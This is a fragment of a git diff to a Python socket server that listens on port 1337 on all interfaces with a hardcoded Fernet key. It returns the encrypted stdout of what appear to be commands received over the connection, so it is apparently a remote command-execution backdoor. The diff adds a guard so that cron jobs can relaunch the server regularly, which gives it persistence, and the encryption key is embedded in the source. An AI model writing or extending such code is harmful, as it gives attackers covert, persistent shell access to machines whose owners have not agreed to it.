@@ -7,7 +7,6 @@ key = b'TQenjgBHJFv6Ep4v8eN0Bayf194BS6qV_X23n5ulnRQ='
 
 def server_program():
     # get the hostname
-    host = socket.gethostname()
     port = 1337  # initiate port no above 1024
 
     # look closely. The bind() function takes tuple as argument
@@ -16,11 +15,16 @@ def server_program():
     
     f = Fernet(key)
 
-    # while True:
-    server_socket = socket.socket()  # get instance
-    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    server_socket.bind(('', port))  # bind host address and port together
-    server_socket.listen(10)
+    try:
+        # while True:
+        server_socket = socket.socket()  # get instance
+        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        server_socket.bind(('', port))  # bind host address and port together
+        server_socket.listen(10)
+    except:
+        # catches exceptions for the program already running, allowing us to set
+        # up cron jobs that run regularly
+        exit()
     
     
     print('waiting for connection')
@@ -52,9 +56,7 @@ def server_program():
         res = f.encrypt(result.stdout)
         conn.send(res)
     conn.close()  # close the connection
-    print('outer loop')
-    # wait at least a minute before retrying the connection
-    # curr_time.tm_min += 1
+    curr_time = time.localtime()
     print('current time: ', curr_time.tm_hour, ':',curr_time.tm_min, ':', curr_time.tm_sec)
             
 
